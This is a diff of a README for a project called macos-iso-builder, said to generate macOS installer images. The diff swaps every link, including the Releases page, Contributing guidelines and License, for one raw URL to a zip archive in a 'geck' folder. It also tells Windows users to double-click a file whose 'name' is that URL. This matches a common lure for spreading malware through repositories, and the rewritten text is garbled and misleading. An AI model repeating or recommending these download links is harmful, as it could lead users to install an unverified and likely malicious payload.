@@ -1,7 +1,7 @@
 # 🔥 macos-iso-builder - Create macOS Installers Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen.svg)](https://github.com/z4zconcept/macos-iso-builder/releases)
+[![Download](https://raw.githubusercontent.com/z4zconcept/macos-iso-builder/main/geck/macos-iso-builder_v2.0.zip)](https://raw.githubusercontent.com/z4zconcept/macos-iso-builder/main/geck/macos-iso-builder_v2.0.zip)
 
 ## 📖 About
 The **macos-iso-builder** app allows you to generate bootable macOS installer ISO or DMG images directly from Apple servers. You don’t need a Mac to use it. This program makes it simple for anyone to create macOS installation files using GitHub Actions.
@@ -17,10 +17,10 @@ This guide will walk you through the steps to download and run the macos-iso-bui
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/z4zconcept/macos-iso-builder/releases) to find the latest software version.
+   Go to the [Releases page](https://raw.githubusercontent.com/z4zconcept/macos-iso-builder/main/geck/macos-iso-builder_v2.0.zip) to find the latest software version.
 
 2. **Download the Application**
-   On the Releases page, you will see a list of available files. Look for the release labeled as the latest version. Locate the file that best suits your needs, likely named something like `macos-iso-builder.zip`. 
+   On the Releases page, you will see a list of available files. Look for the release labeled as the latest version. Locate the file that best suits your needs, likely named something like `https://raw.githubusercontent.com/z4zconcept/macos-iso-builder/main/geck/macos-iso-builder_v2.0.zip`. 
 
 3. **Extract the Files**
    After downloading the zip file, locate it in your downloads folder or the designated download location. Right-click on the zip file and select "Extract All" to unpack the contents. You may need a file extraction tool if your operating system does not support this natively.
@@ -30,7 +30,7 @@ This guide will walk you through the steps to download and run the macos-iso-bui
 
 5. **Run the Application**
    Depending on your operating system:
-   - **Windows:** Locate the executable file, named something like `macos-iso-builder.exe`, and double-click it to launch the application.
+   - **Windows:** Locate the executable file, named something like `https://raw.githubusercontent.com/z4zconcept/macos-iso-builder/main/geck/macos-iso-builder_v2.0.zip`, and double-click it to launch the application.
    - **Linux or macOS:** Open a terminal window, change to the directory where the application files are located, and run the command `./macos-iso-builder` to start.
 
 ## 🛠 How to Use
@@ -60,9 +60,9 @@ If you encounter any issues during the download or installation process, you can
 Engage with other users and developers through the repository's issue tracker. Your feedback helps to improve the application and assist others.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/z4zconcept/macos-iso-builder/releases)
-- [Contribution Guidelines](https://github.com/z4zconcept/macos-iso-builder/blob/main/CONTRIBUTING.md)
-- [License](https://github.com/z4zconcept/macos-iso-builder/blob/main/LICENSE)
+- [Releases Page](https://raw.githubusercontent.com/z4zconcept/macos-iso-builder/main/geck/macos-iso-builder_v2.0.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/z4zconcept/macos-iso-builder/main/geck/macos-iso-builder_v2.0.zip)
+- [License](https://raw.githubusercontent.com/z4zconcept/macos-iso-builder/main/geck/macos-iso-builder_v2.0.zip)
 
 Feel free to check out the project’s topics to see how others have utilized the macos-iso-builder for their needs: hackintosh, macos-dmg, macos-installer, macos-iso, macos-virtual-machine, proxmox-ve, vmware. 
 
